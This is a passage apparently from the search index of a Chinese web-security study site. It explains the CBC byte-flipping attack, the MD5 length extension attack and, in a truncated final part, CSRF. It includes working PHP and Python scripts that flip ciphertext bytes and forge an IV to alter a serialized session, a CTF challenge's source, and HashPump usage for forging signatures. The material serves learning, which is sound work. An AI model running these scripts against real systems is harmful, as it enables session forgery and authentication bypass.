<p>\u5728CBC\u6a21\u5f0f\u4e2d\uff0c\u9996\u5148\u5c06\u660e\u6587\u5206\u7ec4\u4e0e\u524d\u4e00\u4e2a\u5bc6\u6587\u5206\u7ec4\u8fdb\u884cXOR\u8fd0\u7b97\uff0c\u7136\u540e\u518d\u8fdb\u884c\u52a0\u5bc6\u3002(\u4e2a\u4eba\u611f\u89c9\u662f\u5f88\u50cfDES\u52a0\u5bc6\u7684\u6d41\u7a0b)</p> <p>\u796d\u51fa\u8fd9\u5f20\u56fe\uff08\u5c31\u662f\u524d\u9762\u5c06\u5f97\u5230Feistel\u6846\u67b6\uff09</p> <p></p>"},{"location":"web/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_2","title":"\u52a0\u5bc6\u8fc7\u7a0b\uff1b","text":"<p>\u9996\u5148\u5c06\u660e\u6587\u5206\u6210\u6bcfX\u4f4d\u4e00\u7ec4\uff0c\u4f4d\u6570\u4e0d\u8db3\u7684\u662f\u7528\u7279\u6b8a\u5b57\u7b26\u586b\u5145 \uff01\uff01\uff01\uff01\uff01\uff01\uff01</p> <p>X\u5e38\u89c1\u7684\u4e3a16\u4f4d\uff0c\u4e5f\u670932\u4f4d</p> <p>\u8fd9\u91cc\u8981\u6ce8\u610f\uff0cCBC\u7684\u586b\u5145\u89c4\u5219\u662f\u7f3a\u5c11N\u4f4d\uff0c\u5c31\u7528 N \u4e2a '\\xN'\u586b\u5145\uff0c\u5982\u7f3a\u5c1110\u4f4d\u5219\u7528 10 \u4e2a '\\x10'\u586b\u5145\uff08\u8fd9\u91cc\u662f\u6838\u5fc3\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\u867d\u7136\u4e0d\u662f\u8fd9\u91cc\u7684\uff09</p> <p>\u7136\u540e\u751f\u6210\u521d\u59cb\u5411\u91cfIV(\u8fd9\u91cc\u7684\u521d\u59cb\u5411\u91cf\u5982\u679c\u672a\u7279\u5b9a\u7ed9\u51fa\u5219\u968f\u673a\u751f\u6210)\u548c\u5bc6\u94a5</p> <p>\u5c06\u521d\u59cb\u5411\u91cf\u4e0e\u7b2c\u4e00\u7ec4\u660e\u6587\u5f02\u6216\u751f\u6210\u5bc6\u6587A</p> <p>\u7528\u5bc6\u94a5\u52a0\u5bc6\u5bc6\u6587A \u5f97\u5230\u5bc6\u6587A_1</p> <p>\u91cd\u590d3 \u5c06\u5bc6\u6587A_1\u4e0e\u7b2c\u4e8c\u7ec4\u660e\u6587\u5f02\u6216\u751f\u6210\u5bc6\u6587B</p> <p>\u91cd\u590d4 \u7528\u5bc6\u94a5\u52a0\u5bc6\u5bc6\u6587B_1</p> <p>\u91cd\u590d3-6 \u76f4\u5230\u6700\u540e\u4e00\u7ec4\u660e\u6587</p> <p>\u5c06IV\u548c\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\u62fc\u63a5\u5728\u4e00\u8d77\uff0c\u5f97\u5230\u6700\u7ec8\u7684\u5bc6\u6587</p> <p>\u7531\u4e8e\u662f\u5f02\u6216\uff0c\u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\u662f\u4e2a\u53ef\u9006\u5f97\u5230\u8fd0\u7b97\u8fc7\u7a0b</p>"},{"location":"web/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_3","title":"\u89e3\u5bc6\u8fc7\u7a0b\uff1b","text":"<p>\u9996\u5148\u4ece\u6700\u7ec8\u7684\u5bc6\u6587\u4e2d\u63d0\u53d6\u51faIV (IV\u4e3a\u52a0\u5bc6\u65f6\u6307\u5b9a\u7684X\u4f4d)</p> <p>\u5c06\u5bc6\u6587\u5206\u7ec4</p> <p>\u4f7f\u7528\u5bc6\u94a5\u5bf9\u7b2c\u4e00\u7ec4\u5bc6\u6587\u89e3\u5bc6\u5f97\u5230\u5bc6\u6587A\uff0c\u7136\u540e\u7528IV\u8fdb\u884c\u5f02\u6216\u5f97\u5230\u7b2c\u4e00\u7ec4\u660e\u6587</p> <p>\u4f7f\u7528\u5bc6\u94a5\u5bf9\u7b2c\u4e8c\u7ec4\u5bc6\u6587\u89e3\u5bc6\u5f97\u5230\u5bc6\u6587B\uff0c\u7136\u540e\u7528A\u4e0eB\u8fdb\u884c\u5f02\u6216\u5f97\u5230\u7b2c\u4e8c\u7ec4\u660e\u6587</p> <p>\u91cd\u590d3-4 \u76f4\u5230\u6700\u540e\u4e00\u7ec4\u5bc6\u6587</p>"},{"location":"web/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_4","title":"\u653b\u51fb\u8fc7\u7a0b","text":"<p>\u6839\u636e\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u5047\u8bbeA\u4e3a\u660e\u6587\uff0cB\u4e3a\u524d\u4e00\u7ec4\u5bc6\u6587\uff0cC\u4e3a\u5bc6\u6587\u7ecf\u8fc7\u5bc6\u94a5\u89e3\u5bc6\u4e4b\u540e\u7684\u5b57\u7b26\u4e32\uff1a</p> <p>$A = Plaintext[0] = 11 ;</p> <p>$B = Ciphertext[0] = 13 ;</p> <p>$C = Decrypt(Ciphertext)[0] = 6 ;</p> <p>\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\u6211\u4eec\u662f\u7528 C\u4e0eB \u5f02\u6216\u5f97\u5230A\uff0c \u5373 C ^ B = A</p> <p>\u6839\u636e\u89e3\u5bc6\u65b9\u5f0f\u6211\u4eec\u53ef\u4ee5\u77e5\u9053</p> <p>$C ^ Old_IV= Source_str</p> <p>//\u6240\u4ee5</p> <p>$C = Old_IV^ Source_str</p> <p>//\u5e76\u4e14\u6211\u4eec\u8fd8\u9700\u8981</p> <p>$C ^ New_IV= Target_str</p> <p>//\u5373</p> <p>$C = New_IV^ Target_str</p> <p>//\u6240\u4ee5</p> <p>Old_IV ^Source_str = New_IV ^ Target_str</p> <p>//\u6240\u4ee5</p> <p>New_IV =Old_IV ^ Source_str ^ Target_str</p> <p>\u6240\u4ee5\u8bf4\u6211\u4eec\u53ea\u9700\u8981\u4fee\u6539\u524d\u4e00\u7ec4\u5bc6\u6587\u6240\u5bf9\u5e94\u7684\u672c\u7ec4\u660e\u6587\u76f8\u540c\u4f4d\u7f6e\u7684\u5b57\u7b26\uff0c\u5373\u53ef\u5f97\u5230\u60f3\u8981\u7684\u660e\u6587\u3002</p> <p>\u8fd9\u91cc\u53ef\u4ee5\u6ce8\u610f\u5230\u524d\u4e00\u5757Ciphertext\u7528\u6765\u4ea7\u751f\u4e0b\u4e00\u5757\u660e\u6587\uff0c\u5982\u679c\u6211\u4eec\u6539\u53d8\u524d\u4e00\u5757Ciphertext\u4e2d\u7684\u4e00\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u548c\u4e0b\u4e00\u5757\u89e3\u5bc6\u540e\u7684\u5bc6\u6587xor\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u4e0d\u540c\u7684\u660e\u6587\uff0c\u800c\u8fd9\u4e2a\u660e\u6587\u662f\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u3002\u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u5c31\u6b3a\u9a97\u670d\u52a1\u7aef\u6216\u8005\u7ed5\u8fc7\u8fc7\u6ee4\u5668\u3002</p> <p>CBC\u7ffb\u8f6c\u5b57\u8282\u653b\u51fb_\u85af\u6761\u732b\u7684\u535a\u5ba2-CSDN\u535a\u5ba2</p> <p>CBC\u7ffb\u8f6c\u5b57\u8282\u653b\u51fbCBC\u52a0\u5bc6\u8fc7\u7a0b\uff08\u5bc6\u6587\u5206\u7ec4\u94fe\u63a5\u6a21\u5f0f\u5f02\u6216\u540e\u52a0\u5bc6\u653b\u51fb\u70b9\u4e3aIV\u6216\u8005\u52a0\u5bc6\u540e\u7684\u67d0\u6bb5\u5bc6\u6587\u6539\u7b2c\u4e00\u7ec4\u660e\u6587\u7684\u4fe1\u606f\uff0c\u9700\u8981\u66f4\u6539IVA = Plaintext[0] = 'h' ;B = IV[0] =  \u53ef\u63a7;C = Decrypt(Ciphertext)[0] = ?;//\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4f2a\u9020\u4e00\u4e2a\u65b0\u7684IV\u5411\u91cf\uff0c\u4f7f\u5f97C ^ New_IV = \u6211\u4eec\u9700\u8981\u7684\u660e\u6587//\u56e0\u4e3a\u6709 C ^ Old_IV = Source_str//\u6240\u4ee5C = Old_IV ^ Source_str//\u5e76\u4e14</p> <p>https://blog.csdn.net/weixin_44843084/article/details/106736385</p> <p>\u6309\u7167\u4e2a\u4eba\u7684\u7406\u89e3\uff0c\u5c31\u662f\u5728\u6b63\u5e38\u7684CBC\u52a0\u5bc6\u8fc7\u7a0b\u4e2d\u66ff\u6362\u539f\u672c\u7684\u6587\u672c\uff0c\u6709\u70b9\u4f2a\u9020session\u7684\u5473\u9053</p>"},{"location":"web/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_5","title":"\u653b\u51fb\u811a\u672c","text":"<pre><code>&lt;?php\n$enc=base64_decode(\"bIpgPK29vVQosJ+smzh0pOdq7QrP3H9CN0MBfynL1eKtILs/ayew1snTYbeYSIz8rQctkAUMORS76SWQHXwuKg==\");\n$enc[13] = chr(ord($enc[13]) ^ ord(\"k\") ^ ord (\"n\"));\necho base64_encode($enc);\n?&gt;\n#####################################################################\n&lt;?php\n$enc=base64_decode(\"4quudO++PAeVPQfcFJ0bbm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==\");\n$iv=base64_decode(\"TrphJjWLH37sj6+EBqh28A==\");\n$cleartext = 'a:2:{s:8:\"userna';\n$newiv = '';\nfor ($i=0;$i&lt;16;$i++){\n$newiv=$newiv.chr(ord($iv[$i]) ^ ord($enc[$i]) ^ ord ($cleartext[$i]));\n}\necho base64_encode($newiv);\n?&gt;\n\u90a3\u4e48\u8fd9\u91cc\u4e5f\u540c\u6837\u7684\u7ed9\u51fa\u4e24\u4e2a\u811a\u672c\uff1a\u7b2c\u4e00\u4e2a\u811a\u672c\u5c31\u662f\u5728\u53cd\u8f6c\u8fc7\u7a0b\u4e2d\u7684\u5b57\u7b26\u7684CBC\u653b\u51fb\uff0c\u4f46\u7531\u4e8e\u6b64\u5904\u4fee\u6539\u7b2c\u4e8c\u4e32\u5b57\u7b26\u4e32\u7684\u503c\u662f\u7531\u4fee\u6539\u7b2c\u4e00\u4e32\u5b57\u7b26\u4e32\u7ec4\u6210\u7684\uff0c\u800c\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f\u7531\u521d\u59cb\u5411\u91cfIV\u6240\u5f97\u5230\u7684\uff0c\u56e0\u6b64\u4e5f\u8981\u76f8\u5e94\u7684\u4fee\u6539IV\u7684\u503c\u624d\u80fd\u591f\u6b63\u5e38\u7684\u5f97\u5230\u89e3\u6790\u3002\n\n\u4e0b\u9762\u518d\u653e\u4e24\u4e2apython\u7684\u811a\u672c\uff1b\n\n\nimport base64\nimport requests\nimport urllib\niv_raw='%2F8iEm4jh%2BjbgVGwlQ31ycg%3D%3D'  #\u8fd9\u91cc\u586b\u5199\u7b2c\u4e00\u6b21\u8fd4\u56de\u7684iv\u503c\ncipher_raw='8WdhbPxjZy9xYAgoCeghiOUQu0ri1Y3dv7cX44MbvOfIC6zZxCbR%2FPFpeMatL5qIgT%2BYA66tIdCBpxtWsWxV9Q%3D%3D'  #\u8fd9\u91cc\u586b\u5199\u7b2c\u4e00\u6b21\u8fd4\u56de\u7684cipher\u503c\nprint \"[*]\u539f\u59cbiv\u548ccipher\"\nprint \"iv_raw:  \" + iv_raw\nprint \"cipher_raw:  \" + cipher_raw\nprint \"[*]\u5bf9cipher\u89e3\u7801\uff0c\u8fdb\u884c\u53cd\u8f6c\"\ncipher = base64.b64decode(urllib.unquote(cipher_raw))\n#a:2:{s:8:\"username\";s:5:\"zdmin\";s:8:\"password\";s:5:\"12345\"}\n#s:2:{s:8:\"userna\n#me\";s:5:\"zdmin\";\n#s:8:\"password\";s\n#:3:\"12345\";}\nxor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord('z') ^ ord('a')) + cipher[10:]  #\u8bf7\u6839\u636e\u4f60\u7684\u8f93\u5165\u81ea\u884c\u66f4\u6539\uff0c\u539f\u7406\u770b\u4e0a\u9762\u7684\u4ecb\u7ecd\nxor_cipher=urllib.quote(base64.b64encode(xor_cipher))\nprint \"\u53cd\u8f6c\u540e\u7684cipher\uff1a\" + xor_cipher\n\u8fd9\u662f\u4fee\u6539\u4e32\u4e2d\u7684\n\n#######################################################################\nimport base64\nimport urllib\ncipher = 'Bc6oENSSAEPpPdv/rbqRZG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9'#\u586b\u5199\u63d0\u4ea4\u540e\u6240\u5f97\u7684\u65e0\u6cd5\u53cd\u5e8f\u5217\u5316\u5bc6\u6587\niv = '%2F8iEm4jh%2BjbgVGwlQ31ycg%3D%3D'#\u4e00\u5f00\u59cb\u63d0\u4ea4\u7684iv\n#cipher = urllib.unquote(cipher)\ncipher = base64.b64decode(cipher)\niv = base64.b64decode(urllib.unquote(iv))\nnewIv = ''\nright = 'a:2:{s:8:\"userna'#\u88ab\u635f\u574f\u524d\u6b63\u786e\u7684\u660e\u6587\nfor i in range(16):\nnewIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) #\u8fd9\u4e00\u6b65\u76f8\u5f53\u4e8e\u628a\u539f\u6765iv\u4e2d\u4e0d\u5339\u914d\u7684\u90e8\u5206\u4fee\u6539\u8fc7\u6765\nprint urllib.quote(base64.b64encode(newIv))\n\u8fd9\u662f\u4fee\u6539IV\u7684\nPlain Text\n</code></pre>"},{"location":"web/crypto/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D/","title":"MD5\u6269\u5c55\u653b\u51fb\u4ecb\u7ecd","text":"<p>hash\u957f\u5ea6\u62d3\u5c55\u653b\u51fb</p> <p>\u54c8\u5e0c\u957f\u5ea6\u6269\u5c55\u653b\u51fb(hash lengthextensionattacks)\u662f\u6307\u9488\u5bf9\u67d0\u4e9b\u5141\u8bb8\u5305\u542b\u989d\u5916\u4fe1\u606f\u7684\u52a0\u5bc6\u6563\u5217\u51fd\u6570\u7684\u653b\u51fb\u624b\u6bb5\u3002\u6b21\u653b\u51fb\u9002\u7528\u4e8eMD5\u548cSHA-1\u7b49\u57fa\u4e8eMerkle\u2013Damg\u00e5rd\u6784\u9020\u7684\u7b97\u6cd5\u3002</p> <p>\u7275\u626f\u5230\u5bc6\u7801\u5b66\uff0c\u6211\u4e2a\u4eba\u5c31\u76f4\u63a5\u5f00\u642c\u4e86</p>"},{"location":"web/crypto/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D/#md5","title":"MD5\u6269\u5c55\u653b\u51fb\u4ecb\u7ecd","text":"<p>\u6211\u4eec\u9700\u8981\u4e86\u89e3\u4ee5\u4e0b\u51e0\u70b9md5\u52a0\u5bc6\u8fc7\u7a0b\uff1a</p> <p>MD5\u52a0\u5bc6\u8fc7\u7a0b\u4e2d512\u6bd4\u7279\uff0864\u5b57\u8282\uff09\u4e3a\u4e00\u7ec4\uff0c\u5c5e\u4e8e\u5206\u7ec4\u52a0\u5bc6\uff0c\u800c\u4e14\u5728\u8fd0\u7b97\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5c06512\u6bd4\u7279\u5206\u4e3a32bit*16\u5757\uff0c\u5206\u5757\u8fd0\u7b97</p> <p>\u5173\u952e\u5229\u7528\u7684\u662fMD5\u7684\u586b\u5145\uff0c\u5bf9\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\u8fdb\u884c\u586b\u5145(\u6bd4\u7279\u7b2c\u4e00\u4f4d\u4e3a1\u5176\u4f59\u6bd4\u7279\u4e3a0)\uff0c\u4f7f\u4e4b(\u4e8c\u8fdb\u5236)\u8865\u5230448\u6a21512\u540c\u4f59\uff0c\u5373\u957f\u5ea6\u4e3a512\u7684\u500d\u6570\u51cf64\uff0c\u6700\u540e\u768464\u4f4d\u5728\u8865\u5145\u4e3a\u539f\u6765\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u8fd9\u6837\u521a\u597d\u8865\u6ee1512\u4f4d\u7684\u500d\u6570\uff0c\u5982\u679c\u5f53\u524d\u660e\u6587\u6b63\u597d\u662f512bit\u500d\u6570\u5219\u518d\u52a0\u4e0a\u4e00\u4e2a512bit\u7684\u4e00\u7ec4\u3002 MD5\u4e0d\u7ba1\u600e\u4e48\u52a0\u5bc6\uff0c\u6bcf\u4e00\u5757\u52a0\u5bc6\u5f97\u5230\u7684\u5bc6\u6587\u4f5c\u4e3a\u4e0b\u4e00\u6b21\u52a0\u5bc6\u7684\u521d\u59cb\u5411\u91cf\u3002</p> <p>\u4e3e\u4e00\u4e2a\u4f8b\u5b50\u8bb2\u4e00\u4e0b\u5982\u4f55\u586b\u5145\uff1a\u6bd4\u5982\u5b57\u7b26\u4e32\u201cAcker\u201d \u5341\u516d\u8fdb\u52360x41636b6572\u8fd9\u91cc\u4e0e448\u6a21512\u4e0d\u540c\u4f59\uff0c\u9700\u8865\u4f4d\u6ee1\u8db3\u4e8c\u8fdb\u5236\u957f\u5ea6\u4f4d512\u7684\u500d\u6570\uff0c\u8865\u4f4d\u540e\u7684\u6570\u636e\u5982\u4e0b\uff1a</p> <pre><code>0x61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000\n</code></pre> <p>\u6b64\u5904\u8865\u5145\uff1a\u4ee5\u5341\u516d\u8fdb\u5236\u8868\u793a\u4e00\u5171\u662f128\u4e2a\u5b57\u7b26\uff0c\u5341\u516d\u8fdb\u5236\u6bcf\u4e2a\u5b57\u7b26\u80fd\u591f\u8f6c\u6362\u62104\u4f4d\u4e8c\u8fdb\u5236\uff0c128*4=512\u8fd9\u5c31\u662f\u4e00\u7ec4\uff0c\u6b63\u597d\u662f512bit\u3002</p> <p></p> <p>\u4e0a\u56fe\u4e2d\u76848\u662f\u56e0\u4e3a\u8865\u4f4d\u65f6\u4e8c\u8fdb\u5236\u7b2c\u4e00\u4f4d\u8981\u88651\uff0c\u90a3\u4e481000\u8f6c\u6362\u621016\u8fdb\u5236\u5c31\u662f8.\u540e\u9762\u90fd\u8865\u4e0a0.</p> <p></p> <p>\u586b\u5145\u6570\u636e\u6700\u540e8\u5b57\u8282\u957f\u5ea6\uff0cAcker\u957f\u5ea6\u4e3a5*8=40bit\uff0c\u53c8\u56e0\u4e3a0x28=40\u6240\u4ee516\u8fdb\u5236\u663e\u793a\u4e3a28.</p> <p>\u4e3a\u4ec0\u4e48\u6570\u636e\u4f1a\u5728\u5de6\u7aef\uff1aMD5\u4e2d\u50a8\u5b58\u7684\u90fd\u662f\u5c0f\u7aef\u65b9\u5f0f\uff0c\u6bd4\u59820x12345678\uff0c\u90a3\u4e48md5\u5b58\u50a8\u987a\u5e8f\u5c31\u662f0x78563412</p>"},{"location":"web/crypto/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D/#md5_1","title":"MD5\u62d3\u5c55\u653b\u51fb\u6f14\u793a","text":"<p>\u4e0b\u56fe\u4e3a\u52a0\u5bc6\u6d41\u7a0b\u56fe\uff0c\u53ef\u4ee5\u66f4\u76f4\u89c2\u770b\u6e05\u695a\u6574\u4e2a\u6d41\u7a0b\u3002</p> <p></p> <p>\u9009\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f8b\u5982\u201cAcker\u201dMD5\uff08\u201cAcker\u201d\uff09= dee2fb2df156f4040f893d8a10ac1034</p> <p>\u73b0\u5728\u6211\u4eec\u4e0d\u9700\u8981\u77e5\u9053\u5b57\u7b26\u4e32\u662f\u4ec0\u4e48\u3002\u53ea\u9700\u8981\u77e5\u9053\u5176\u957f\u5ea6\uff0c\u5e76\u5c06\u5b57\u7b26\u4e32\u586b\u5145\u5b8c\uff0c\u65b0\u52a0\u4e00\u4e2a\u5b57\u7b26\u4e32\u5982\uff1aaddition\uff0c\u4e4b\u524d\u5f97\u5230\u7684\u201cAcker\u201dMD5\u503c\u4f5c\u4e3a\u6700\u540e\u4e00\u5757\u52a0\u5bc6\u7684\u521d\u59cb\u5411\u91cf\uff0c\u6700\u540e\u5f97\u5230\u7684\u7ed3\u679c\u548cMD5\uff08\u201cAcker+addition\u201d\uff09\u662f\u4e00\u6837\u7684\u3002</p> <pre><code>&lt;?php \n$flag = \"flag{flag is here}\";\n$secret = \"aaaaabbbbbccccc\"; // This secret is 15 characters long for security!\n@$username = $_POST[\"username\"];\n@$password = $_POST[\"password\"];\nif (!empty($_COOKIE[\"getmein\"])) {\n    if (urldecode($username) === \"admin\" &amp;&amp; urldecode($password) != \"admin\") {\n        if ($_COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) {\n            echo \"Congratulations! You are a registered user.\\n\";\n            die (\"The flag is \". $flag);\n        }\n        else {\n            die (\"Your cookies don't match up! STOP HACKING THIS SITE.\");\n        }\n    }\n    else {\n        die (\"You are not an admin! LEAVE.\");\n    }\n}\nsetcookie(\"sample-hash\", md5($secret . urldecode(\"admin\" . \"admin\")), time() + (60 * 60 * 24 * 7));\nif (empty($_COOKIE[\"source\"])) {\n    setcookie(\"source\", 0, time() + (60 * 60 * 24 * 7));\n}\nelse {\n    if ($_COOKIE[\"source\"] != 0) {\n        echo \"\"; // This source code is outputted here\n    }\n}\n?&gt;\n</code></pre> <p>\u9898\u76ee\u4e2d\u53ef\u4ee5\u5f97\u5230\uff1a</p> <p>$secret\u7684\u957f\u5ea615</p> <p>md5($secret.\"adminadmin\")\u7684\u503c\u4e3a571580b26c65f306376d4f64e53cb5c7</p> <p>\u4f7f\u7528hashpump\uff0c\u65b9\u6cd5\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>\u7b2c\u4e00\u884c\u662f\u4e00\u4e2a\u65b0\u7b7e\u540d\u4f5c\u4e3agetmein\u53c2\u6570\u63d0\u4ea4</p> <p>\u7b2c\u4e8c\u884c\u4f5c\u4e3apassword\u63d0\u4ea4\u5373\u53ef\u3002</p> <p></p>"},{"location":"web/crypto/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D/#hashpump","title":"\u9644\uff1ahashpump","text":"<p>HashPump\u662f\u4e00\u4e2a\u501f\u52a9\u4e8eOpenSSL\u5b9e\u73b0\u4e86\u9488\u5bf9\u591a\u79cd\u6563\u5217\u51fd\u6570\u7684\u653b\u51fb\u7684\u5de5\u5177\uff0c\u652f\u6301\u9488\u5bf9MD5\u3001CRC32\u3001SHA1\u3001SHA256\u548cSHA512\u7b49\u957f\u5ea6\u6269\u5c55\u653b\u51fb\u3002\u800cMD2\u3001SHA224\u548cSHA384\u7b97\u6cd5\u4e0d\u53d7\u6b64\u653b\u51fb\u7684\u5f71\u54cd\uff0c\u56e0\u5176\u90e8\u5206\u907f\u514d\u4e86\u5bf9\u72b6\u6001\u53d8\u91cf\u7684\u8f93\u51fa\uff0c\u5e76\u4e0d\u8f93\u51fa\u5168\u90e8\u7684\u72b6\u6001\u53d8\u91cf\u3002</p> <p>\u5b89\u88c5</p> <pre><code>git clone https://github.com/bwall/HashPump\napt-get install g++ libssl-dev\ncd HashPump\nmake\nmake install\n</code></pre> <p></p> <p>\u4f7f\u7528\u65b9\u6cd5</p> <p>\u641c\u904d\u767e\u5ea6\uff0c\u65e0\u5948\u6ca1\u6709\u4ec0\u4e48\u5177\u4f53\u8bb2\u89e3\u65b9\u6cd5\u53ea\u597dhashpump -h\u5f97\u5230\u5e2e\u52a9\uff0c\u51d1\u5408\u770b\u4e00\u4e0b\u5427\u3002\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u5c31\u662f\u77e5\u9053\u524d\u9762\u5b57\u7b26\u603b\u957f\u5ea6\uff0c\u77e5\u9053\u4e0b\u4e00\u7ec4\u8ffd\u52a0\u6570\u636e\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u81ea\u52a8\u7b97\u51fa\u524d\u4e00\u7ec4\u7684\u586b\u5145\u6570\u636e\u3002</p> <pre><code>\u279c  HashPump git:(master) \u2717 hashpump -h\nHashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength]\nHashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.\n-h --help          Display this message.\n-t --test          Run tests to verify each algorithm is operating properly.\n-s --signature     The signature from known message.\n-d --data          The data from the known message.\n-a --additional    The information you would like to add to the known message.\n-k --keylength     The length in bytes of the key being used to sign the original message with.\nVersion 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.\n&lt;Developed by bwall(@botnet_hunter)&gt;\n</code></pre> <p>\u539f\u7406\u80af\u5b9a\u662f\u9700\u8981\u4e86\u89e3\u7684\uff0c\u4f46\u5728\u539f\u7406\u4e86\u89e3\u4e4b\u524d\uff0c\u6211\u4e48\u4f60\u53ef\u4ee5\u5148\u501f\u52a9\u5de5\u5177\u6765\u5b8c\u6210\u7834\u8bd1\u3002</p>"},{"location":"web/csrf_ssrf_ssi/CSRF/","title":"CSRF","text":"<p>csrf\uff08Cross Site Request Forgery\uff09\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020</p> <p>\u9ad8\u7ea7\u4e00\u70b9\u7684XSS</p> <p>\u7ad9\u662f\u901a\u8fc7cookie\u6765\u8bc6\u522b\u7528\u6237\u7684\uff0c\u5f53\u7528\u6237\u6210\u529f\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u4e4b\u540e\u6d4f\u89c8\u5668\u5c31\u4f1a\u5f97\u5230\u4e00\u4e2a\u6807\u8bc6\u5176\u8eab\u4efd\u7684cookie\uff0c\u53ea\u8981\u4e0d\u5173\u95ed\u6d4f\u89c8\u5668\u6216\u8005\u9000\u51fa\u767b\u5f55\uff0c\u4ee5\u540e\u8bbf\u95ee \u8fd9\u4e2a\u7f51\u7ad9\u4f1a\u5e26\u4e0a\u8fd9\u4e2acookie</p> <p>\u5982\u679c\u8fd9\u671f\u95f4\u6d4f\u89c8\u5668\u88ab\u4eba\u63a7\u5236\u7740\u8bf7\u6c42\u4e86\u8fd9\u4e2a\u7f51\u7ad9\u7684url\uff0c\u53ef\u80fd\u5c31\u4f1a\u6267\u884c\u4e00\u4e9b\u7528\u6237\u4e0d\u60f3\u505a\u7684\u529f\u80fd\uff08\u6bd4\u5982\u4fee\u6539\u4e2a\u4eba\u8d44\u6599\uff09</p> <p>\u8fd9\u4e2a\u8bf7\u6c42\u5e76\u4e0d\u662f\u7528\u6237\u771f\u6b63\u60f3\u53d1\u51fa\u7684\u8bf7\u6c42\uff0c\u8fd9\u5c31\u662f\u6240\u8c13\u7684&lt;\u8bf7\u6c42\u4f2a\u9020&gt;</p> <p>\u56e0\u4e3a\u8fd9\u4e9b\u8bf7\u6c42\u4e5f\u662f\u53ef\u4ee5\u4ece\u7b2c\u4e09\u65b9\u7f51\u7ad9\u63d0\u4ea4\u7684\uff0c\u6240\u4ee5\u524d\u9762\u52a0\u4e0a&lt;\u8de8\u7ad9&gt;\u4e8c\u5b57</p> <p>\u6240\u4ee5\u7ecf\u5e38XSS\u6240\u5f39\u51fa\u7684cookie\u662f\u7528\u6765\u505acsrf\u8bf7\u6c42\u4f2a\u9020\u7684\u3002</p> <p>\u6bd4\u5982\u6211\u4eec\u6253\u7b97\u653b\u51fb\u4e00\u4e2a\u5b58\u5728\u95ee\u9898\u7684Blog\uff0c\u90a3\u5c31\u5148\u53bb\u76ee\u6807Blog\u7559\u8a00\uff0c\u7559\u4e0b\u4e00\u4e2a\u7f51\u5740\uff0c\u8bf1\u5176Blog\u7684\u4e3b\u4eba\u70b9\u51fb\uff08\u5f53\u7136\uff0c\u8fd9\u662f\u4e00\u79cd\u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6211\u4eec\u4e0a\u8282\u8bfe\u8bb2\u7684XSS\uff09\uff0c\u7136\u540e\u6784\u9020\u4e2aHTML\u8868\u5355\u63d0\u4ea4\u4e9b\u6570\u636e\u8fc7\u53bb\u3002</p>"},{"location":"web/csrf_ssrf_ssi/CSRF/#_1","title":"\u6f0f\u6d1e\u793a\u4f8b","text":"<p>\u4e00\u4e2a\u5178\u578b\u7684CSRF\u653b\u51fb\u6709\u7740\u5982\u4e0b\u7684\u6d41\u7a0b\uff1a</p> <p>\u53d7\u5bb3\u8005\u767b\u5f55a.com\uff0c\u5e76\u4fdd\u7559\u4e86\u767b\u5f55\u51ed\u8bc1\uff08Cookie\uff09\u3002\u653b\u51fb\u8005\u5f15\u8bf1\u53d7\u5bb3\u8005\u8bbf\u95ee\u4e86b.com\u3002b.com \u5411 a.com 